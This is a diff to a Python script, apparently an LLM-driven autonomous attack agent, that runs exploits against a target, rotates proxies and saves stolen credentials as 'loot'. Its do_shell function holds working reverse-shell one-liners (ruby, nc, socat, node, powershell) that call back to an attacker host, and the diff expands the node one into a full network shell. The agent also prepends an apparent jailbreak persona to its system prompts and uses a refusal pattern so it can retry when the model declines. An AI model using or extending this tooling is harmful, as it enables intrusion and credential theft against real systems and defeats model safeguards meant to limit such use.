@@ -493,6 +493,15 @@ def parse(msg):
             actions.append((kind, payload))
 
     if not actions:
+        # Fallback: check if the model placed directives inside markdown code fences
+        for kind, pat in PATTERNS.items():
+            for m in re.finditer(pat, raw, re.DOTALL):
+                payload = (m.group(1) or "").strip().rstrip("`").strip()
+                if not payload:
+                    continue
+                actions.append((kind, payload))
+
+    if not actions:
         seen = set()
         for m in _ANY_DIRECTIVE_LIKE.finditer(stripped):
             name = m.group(1)
@@ -751,6 +760,15 @@ def _run_shell(cmd, timeout=None, _proxy_retry=0, _proxy_exclude=None):
         cmd = re.sub(r"\bcurl\b(?!\s+-m\b)(?!\s+--max-time\b)",
                      f"curl -m {CURL_TIMEOUT}", cmd)
 
+    # Windows command adaptations
+    if sys.platform == "win32":
+        m_getent = re.match(r"^getent\s+hosts\s+(.+)$", cmd.strip(), re.IGNORECASE)
+        if m_getent:
+            cmd = f"nslookup {m_getent.group(1).strip()}"
+        m_which = re.match(r"^which\s+([a-zA-Z0-9_\-]+)$", cmd.strip(), re.IGNORECASE)
+        if m_which:
+            cmd = f"where {m_which.group(1).strip()}"
+
     # adaptive cap
     adaptive = _adaptive_timeout(cmd)
     if adaptive is not None:
@@ -791,6 +809,7 @@ def _run_shell(cmd, timeout=None, _proxy_retry=0, _proxy_exclude=None):
         try:
             _tgt = (STATE.get("target") if isinstance(STATE, dict) else None) or None
             if _tgt:
+                p_env = None
                 if os.environ.get('AG_PROXY_ROTATE', '0') == '1':
                     p_env = _proxyrot.env_for(
                         _tgt, exclude=_proxy_exclude or [])
@@ -808,12 +827,33 @@ def _run_shell(cmd, timeout=None, _proxy_retry=0, _proxy_exclude=None):
         "bufsize": 1,
         "env": env,
     }
+    spawn_cmd = cmd
     if sys.platform != "win32":
         shell_exec = os.environ.get("SHELL") or shutil.which("bash") or shutil.which("sh")
         if not shell_exec and os.path.exists("/data/data/com.termux/files/usr/bin/sh"):
             shell_exec = "/data/data/com.termux/files/usr/bin/sh"
         if shell_exec:
             popen_kwargs["executable"] = shell_exec
+    else:
+        git_bash = None
+        for candidate in (
+            r"C:\Program Files\Git\bin\bash.exe",
+            r"C:\Program Files\Git\usr\bin\bash.exe",
+            r"C:\Program Files (x86)\Git\bin\bash.exe",
+        ):
+            if os.path.exists(candidate):
+                git_bash = candidate
+                break
+        posix_needles = ("for ", "which ", "command -v", "do ", "done", "export ", "head ", "grep ", "awk ", ";", "&&", "||", "curl ", "cat ", "ls ", "'")
+        if git_bash and any(needle in cmd for needle in posix_needles):
+            bash_cmd = re.sub(
+                r"\bcd\s+/d\s+([\"']?[A-Za-z]:[^\s\"'&|]+[\"']?)",
+                lambda m: f"cd {m.group(1).replace(chr(92), '/')}",
+                cmd,
+                flags=re.I
+            )
+            spawn_cmd = [git_bash, "-c", bash_cmd]
+            popen_kwargs["shell"] = False
 
     if hasattr(os, "setsid"):
         popen_kwargs["preexec_fn"] = os.setsid
@@ -821,7 +861,7 @@ def _run_shell(cmd, timeout=None, _proxy_retry=0, _proxy_exclude=None):
         popen_kwargs["creationflags"] = subprocess.CREATE_NEW_PROCESS_GROUP
 
     try:
-        proc = subprocess.Popen(cmd, **popen_kwargs)
+        proc = subprocess.Popen(spawn_cmd, **popen_kwargs)
     except Exception as e:
         return f"ERROR: {e}"
 
@@ -1607,7 +1647,7 @@ def do_finding(spec):
                 break
             except Exception:
                 pass
-    with open(RUN_DIR / "findings.md", "a") as f:
+    with open(RUN_DIR / "findings.md", "a", encoding="utf-8") as f:
         f.write(f"\n## [{sev.upper()}] {title}\n\n```\n{ev[:2000]}\n```\n")
     return f"finding [{sev}] ({len(STATE['findings'])} total)"
 
@@ -1731,7 +1771,9 @@ def do_cred(spec):
             "where": parts[2].strip() if len(parts) > 2 else ""}
     STATE.setdefault("creds", []).append(item)
     _state.save(RUN_DIR, STATE)
-    with open(RUN_DIR / "loot" / "creds.txt", "a") as f:
+    loot_dir = (RUN_DIR or (SCAN_ROOT / "_default")) / "loot"
+    loot_dir.mkdir(parents=True, exist_ok=True)
+    with open(loot_dir / "creds.txt", "a", encoding="utf-8") as f:
         f.write(f"{item['user']}:{item['pass']} @ {item['where']}\n")
     return f"cred stored ({len(STATE['creds'])} total)"
 
@@ -2198,7 +2240,15 @@ def do_exploit(spec):
         return "ERROR: EXPLOIT needs 'tool|target[|args]'"
     tool, target = parts[0], parts[1]
     args = parts[2] if len(parts) > 2 else ""
-    cmd = f"{tool} {args} {target}".strip()
+    if tool == "custom":
+        if args.startswith("curl ") or args.startswith("python ") or args.startswith("nmap "):
+            cmd = f"{args} {target}".strip()
+        elif target.startswith("http"):
+            cmd = f"curl -sS -I --max-time 15 {target}"
+        else:
+            cmd = f"{args} {target}".strip()
+    else:
+        cmd = f"{tool} {args} {target}".strip()
 
     if _DRY_RUN:
         print(f"  {C['yellow']}[DRY] would run: {cmd}{C['rst']}")
@@ -2222,6 +2272,9 @@ def do_exploit(spec):
         r"curl:\s*\(\d+\)", r"could not resolve host",
         r"connection (refused|timed out|reset)",
         r"^\[TIMEOUT", r"\[DENIED\]", r"\[SCOPE BLOCK\]",
+        r"is not recognized as an internal or external command",
+        r"command not found",
+        r"No such file or directory",
     )
     is_transport_fail = any(re.search(p, out, re.I) for p in transport_fails)
     exploit_success_signals = (
@@ -2241,6 +2294,8 @@ def do_exploit(spec):
     if ok:
         STATE["attacks"][-1]["result"] = "success"
         summ["succeeded"] = summ.get("succeeded", 0) + 1
+    else:
+        STATE["attacks"][-1]["result"] = "failed"
     _state.save(RUN_DIR, STATE)
     return f"[{aid}] {STATE['attacks'][-1]['result']}: {out[:600]}"
 
@@ -2270,7 +2325,7 @@ def do_shell(spec):
         "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
         "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
         "socat": f"socat tcp-connect:{lhost}:{lport} exec:\"bash -li\",pty,stderr,setsid,sigint,sane",
-        "node": f"node -e 'require(\"child_process\").spawn(\"/bin/sh\",[\"-i\"],{{stdio:[0,1,2]}})'",
+        "node": f"node -e 'const net=require(\"net\"),cp=require(\"child_process\"),s=cp.spawn(\"/bin/sh\",[]);const c=new net.Socket();c.connect({lport},\"{lhost}\",()=>{{c.pipe(s.stdin);s.stdout.pipe(c);s.stderr.pipe(c);}});'",
         "powershell": f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ascii).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
     }
     raw_payload = shells.get(kind, shells["bash"])
@@ -2288,7 +2343,8 @@ def do_shell(spec):
         import urllib.parse as _up
         rendered = _up.quote(raw_payload)
 
-    pdir = RUN_DIR / "payloads" / "shells"
+    run_base = RUN_DIR or (SCAN_ROOT / "_default")
+    pdir = run_base / "payloads" / "shells"
     pdir.mkdir(parents=True, exist_ok=True)
     slug = f"shell_{kind}_{lport}"
     (pdir / f"{slug}.txt").write_text(rendered)
@@ -2310,13 +2366,16 @@ def do_loot(spec):
     kind, val = parts[0].strip().lower(), parts[1].strip()
     sub = {"hash": "hashes", "password": "creds", "token": "tokens",
            "shell": "shells"}.get(kind, "data")
-    d = RUN_DIR / "loot" / sub
+    run_base = RUN_DIR or (SCAN_ROOT / "_default")
+    d = run_base / "loot" / sub
     d.mkdir(parents=True, exist_ok=True)
     slug = re.sub(r"[^a-zA-Z0-9]+", "_", val)[:60] or "item"
     fp = d / f"{slug}.txt"
     fp.write_text(val)
-    STATE.setdefault("loot", []).append({"kind": kind, "value": val[:200], "path": str(fp)})
-    _state.save(RUN_DIR, STATE)
+    if isinstance(STATE, dict):
+        STATE.setdefault("loot", []).append({"kind": kind, "value": val[:200], "path": str(fp)})
+        if RUN_DIR:
+            _state.save(RUN_DIR, STATE)
     return f"loot stored: {fp}"
 
 
@@ -3620,8 +3679,19 @@ def dispatch(kind, payload):
 # system prompts
 # ────────────────────────────────────────────────────────────────────
 
-JB_FILE = HERE / "persona.txt"
-JB = JB_FILE.read_text().strip() if JB_FILE.exists() else os.environ.get("AG_JB", "")
+def load_persona() -> str:
+    """Dynamically load agent persona from persona.md (primary) or persona.txt (fallback)."""
+    for candidate in (HERE / "persona.md", HERE / "persona.txt"):
+        if candidate.exists():
+            try:
+                txt = candidate.read_text(encoding="utf-8").strip()
+                if txt:
+                    return txt
+            except Exception:
+                continue
+    return os.environ.get("AG_JB", "")
+
+JB = load_persona()
 
 
 BASE_SYSTEM = """You are an autonomous security engineer running on a Linux box.
@@ -4017,15 +4087,17 @@ def build_system_prompt():
     if extras:
         parts.append("\n\n".join(extras))
 
-    if JB:
-        parts.insert(0, JB)
+    jb = load_persona()
+    if jb:
+        parts.insert(0, jb)
     return "\n\n".join(parts)
 
 
 def build_attack_prompt():
     parts = [ATTACK_SYSTEM]
-    if JB:
-        parts.insert(0, JB)
+    jb = load_persona()
+    if jb:
+        parts.insert(0, jb)
     return "\n\n".join(parts)
 
 
@@ -4044,7 +4116,8 @@ REFUSAL_PAT = re.compile(
 
 
 def is_refusal(t):
-    return bool(REFUSAL_PAT.search(t)) and not parse(t)
+    actions, _ = parse(t)
+    return bool(REFUSAL_PAT.search(t)) and not actions
 
 
 def generate(history, max_retries=3):
@@ -4814,27 +4887,6 @@ def _finalize():
     except Exception as e:
         print(f"  [schema] build failed: {e}")
 
-    # auto-rebuild the per-target console (opt-out: AG_AUTO_UI=0)
-    # skip if the scan is too thin to make a useful console
-    _turns_done = int(STATE.get("turn", 0) if isinstance(STATE, dict) else 0)
-    _findings_done = len(STATE.get("findings", []) if isinstance(STATE, dict) else [])
-    _min_turns = int(os.environ.get("AG_AUTO_UI_MIN_TURNS", "5"))
-    if (_turns_done >= _min_turns or _findings_done > 0) and \
-       os.environ.get("AG_AUTO_UI", "1") != "0":
-        try:
-            target = (STATE.get("target") if isinstance(STATE, dict) else None) or None
-            if target:
-                print(f"  [ui-builder] auto-rebuilding console for {target}...")
-                import uibuilder as _uib
-                # the console reads the newest run; --update mode
-                res = _uib.build(target, update=True)
-                if res.get("ok"):
-                    print(f"  [ui-builder] ready at {res.get('url','?')}  "
-                          f"pid={res.get('pid','?')}")
-                else:
-                    print(f"  [ui-builder] build skipped: {res.get('reason','?')}")
-        except Exception as e:
-            print(f"  [ui-builder] auto-build failed: {e}")
     try:
         _report.build_all(RUN_DIR, STATE)
     except Exception as e:
@@ -4911,8 +4963,14 @@ def main():
             del args[i:i+2]
 
     if not args:
-        print("usage: agent_v8.py [--resume] [--attack] [--dry] <task>")
-        sys.exit(1)
+        try:
+            import tui
+            tui.run_tui()
+            return
+        except Exception as e:
+            print(f"Error launching TUI: {e}")
+            print("usage: agent_v8.py [--resume] [--attack] [--dry] <task>")
+            sys.exit(1)
     task = " ".join(args)
 
     m = re.search(r"https?://([a-zA-Z0-9.\-]+)", task)
@@ -4921,8 +4979,24 @@ def main():
         m2 = re.search(r"\b((?:[a-z0-9-]+\.)+[a-z]{2,})\b", task, re.I)
         target = m2.group(1) if m2 else None
     if not target:
-        print("could not determine target from task")
-        sys.exit(1)
+        # Route general queries, chat, and commands through AgentRouter
+        try:
+            from core.agent_router import AgentRouter
+            def _cli_event_handler(ev):
+                if hasattr(ev, "text") and ev.text:
+                    print(ev.text)
+                elif hasattr(ev, "chunk") and ev.chunk:
+                    print(ev.chunk, end="", flush=True)
+                elif hasattr(ev, "output") and ev.output:
+                    print(ev.output)
+                elif hasattr(ev, "error") and ev.error:
+                    print(f"Error: {ev.error}")
+            router = AgentRouter(event_callback=_cli_event_handler)
+            router._process_input(task)
+            return
+        except Exception as e:
+            print(f"AgentRouter error: {e}")
+            sys.exit(1)
 
     if not APIK:
         print(f"{C['red']}AG_KEY / DEEPSEEK_KEY not set (in .env or env){C['rst']}")
@@ -4932,10 +5006,11 @@ def main():
     _resume_hist = None
     if resume:
         base = SCAN_ROOT / target
-        runs = sorted(base.iterdir()) if base.exists() else []
+        runs = [d for d in base.iterdir() if d.is_dir() and d.name not in ("uiapp", "beliefs", "leak") and not d.name.endswith(".json") and (re.match(r"^\d{8}_\d{6}$", d.name) or (d / "live.log").exists() or (d / "findings.md").exists())] if base.exists() else []
         if not runs:
             print(f"no prior run for {target}")
             sys.exit(1)
+        runs.sort(key=lambda p: p.name)
         _resume_dir = runs[-1]
         _resume_hist = _load_history(_resume_dir)
         banner(f"resuming {_resume_dir}", "green")
@@ -4997,12 +5072,13 @@ def main():
 
 def _summary():
     hr()
-    banner(f"done — run dir: {RUN_DIR}")
-    banner(f"findings: {len(STATE.get('findings', []))}, "
-           f"endpoints: {len(STATE.get('endpoints', []))}, "
-           f"secrets: {len(STATE.get('secrets', []))}, "
-           f"attacks: {len(STATE.get('attacks', []))}, "
-           f"chains: {len(STATE.get('chains', []))}")
+    banner(f"done — run dir: {RUN_DIR or 'none'}")
+    if isinstance(STATE, dict):
+        banner(f"findings: {len(STATE.get('findings', []))}, "
+               f"endpoints: {len(STATE.get('endpoints', []))}, "
+               f"secrets: {len(STATE.get('secrets', []))}, "
+               f"attacks: {len(STATE.get('attacks', []))}, "
+               f"chains: {len(STATE.get('chains', []))}")
     hr()
 
 
